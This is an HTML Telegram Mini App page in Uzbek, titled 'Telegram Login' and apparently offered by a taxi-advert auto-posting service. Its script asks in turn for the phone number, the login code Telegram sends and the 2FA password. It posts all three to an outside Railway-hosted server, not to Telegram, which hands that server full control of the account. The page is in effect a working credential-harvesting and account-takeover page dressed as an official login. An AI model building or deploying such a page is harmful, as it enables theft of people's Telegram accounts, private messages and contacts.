<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<title>Telegram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- Telegram Mini App SDK -->
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
:root {
    --tg-bg: #0f172a;
    --tg-card: #111827;
    --tg-primary: #2ea6ff;
    --tg-text: #e5e7eb;
    --tg-muted: #9ca3af;
    --tg-success: #22c55e;
    --tg-error: #ef4444;
}

* {
    box-sizing: border-box;
}

body {
    margin: 0;
    background: var(--tg-bg);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    color: var(--tg-text);
}

.container {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}

.card {
    width: 100%;
    max-width: 420px;
    background: var(--tg-card);
    border-radius: 18px;
    padding: 24px;
    box-shadow: 0 20px 40px rgba(0,0,0,.4);
}

.logo {
    text-align: center;
    font-size: 42px;
    margin-bottom: 10px;
}

h1 {
    text-align: center;
    font-size: 22px;
    margin-bottom: 6px;
}

.subtitle {
    text-align: center;
    font-size: 14px;
    color: var(--tg-muted);
    margin-bottom: 24px;
}

.step {
    display: none;
}

.step.active {
    display: block;
}

input {
    width: 100%;
    padding: 14px 16px;
    border-radius: 12px;
    border: none;
    background: #020617;
    color: var(--tg-text);
    font-size: 16px;
    outline: none;
    margin-bottom: 14px;
}

input::placeholder {
    color: #64748b;
}

button {
    width: 100%;
    padding: 14px;
    border-radius: 12px;
    border: none;
    background: var(--tg-primary);
    color: white;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
}

button:active {
    transform: scale(0.98);
}

.info {
    margin-top: 12px;
    font-size: 13px;
    color: var(--tg-muted);
    text-align: center;
}

.footer {
    margin-top: 20px;
    font-size: 12px;
    color: #475569;
    text-align: center;
}
</style>
</head>

<body>
<div class="container">
    <div class="card">

        <div class="logo">üîê</div>
        <h1>Telegram Login</h1>
        <div class="subtitle">
            Profilingizni ulab, avtoxabar yuboring
        </div>

        <!-- PHONE STEP -->
        <div id="phoneStep" class="step active">
            <input id="phone" placeholder="+998********">
            <button type="button" id="sendBtn">üì© Kod yuborish</button>
            <div class="info">
                Telegram sizga tasdiqlash kodi yuboradi
            </div>
        </div>

        <!-- CODE STEP -->
        <div id="codeStep" class="step">
            <input id="code" placeholder="Telegram kodi">
            <button type="button" id="verifyBtn">‚úÖ Tasdiqlash</button>
            <div class="info">
                Telegram‚Äôdan kelgan kodni kiriting
            </div>
        </div>

        <!-- PASSWORD STEP -->
        <div id="passwordStep" class="step">
            <input id="password" type="password" placeholder="Telegram parol (2FA)">
            <button type="button" id="passwordBtn">üîì Kirish</button>
            <div class="info">
                Bu akkauntda 2 bosqichli himoya yoqilgan
            </div>
        </div>

        <div class="footer">
            Taksi e‚Äôlon beruvchi ¬∑ Mini App
        </div>
    </div>
</div>

<script>
const tg = window.Telegram.WebApp;
tg.expand();      // FULLSCREEN
tg.ready();

const SERVER = "https://telegram-bots-production-af1b.up.railway.app/";
let phoneValue = "";

function show(stepId) {
    document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
    document.getElementById(stepId).classList.add("active");
}

// üì© KOD YUBORISH
async function sendCode() {
    const phone = document.getElementById("phone").value.trim();
    if (!phone) {
        alert("Telefon raqamni kiriting");
        return;
    }

    phoneValue = phone;

    const res = await fetch(SERVER, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            action: "send_code",
            phone: phone
        })
    });

    const data = await res.json();

    if (data.status === "code_sent") {
        show("codeStep");
    } else if (data.status === "flood_wait") {
        alert("Biroz kuting: " + data.seconds + " soniya");
    } else {
        alert("Xatolik: " + JSON.stringify(data));
    }
}
// üì© KOD TASDIQLASH
async function verifyCode() {
    const codeInput = document.getElementById("code");
    if (!codeInput) {
        alert("‚ùå Code input topilmadi");
        return;
    }

    const code = codeInput.value.trim();
    if (!code) {
        alert("Kodni kiriting");
        return;
    }

    const res = await fetch(SERVER, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            action: "verify_code",
            phone: phoneValue,
            code: code,
            user_id: Telegram.WebApp.initDataUnsafe?.user?.id
        })

    });

    const data = await res.json();

    alert("SERVER JAVOBI: " + JSON.stringify(data));

    if (data.status === "success") {
        alert("‚úÖ Login muvaffaqiyatli!");
        Telegram.WebApp.close();
    } else if (data.status === "2fa_required") {
    show("passwordStep");
    } else if (data.status === "invalid_code") {
        alert("‚ùå Kod noto‚Äòg‚Äòri");
    } else {
        alert("‚ùå Xatolik: " + JSON.stringify(data));
    }
}


// üîì 2FA PAROL TEKSHIRISH
async function verifyPassword() {
    const password = document.getElementById("password").value.trim();

    if (!password) {
        alert("Parolni kiriting");
        return;
    }

    const res = await fetch(SERVER, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            action: "verify_password",
            phone: phoneValue,
            password: password,
            user_id: Telegram.WebApp.initDataUnsafe?.user?.id
        })
    });

    const data = await res.json();

    console.log("2FA response:", data); // üîç DEBUG

    if (data.status === "success") {
        alert("‚úÖ Login muvaffaqiyatli!");

        if (window.Telegram && Telegram.WebApp) {
            Telegram.WebApp.close();   // üîê MINI APP YOPILADI
        }
    } else if (data.status === "invalid_password") {
        alert("‚ùå Parol noto‚Äòg‚Äòri");
    } else {
        alert("‚ùå Xatolik: " + JSON.stringify(data));
    }
}
document.getElementById("sendBtn").addEventListener("click", sendCode);
document.getElementById("verifyBtn").addEventListener("click", verifyCode);
document.getElementById("passwordBtn").addEventListener("click", verifyPassword);



</script>
</body>
</html>
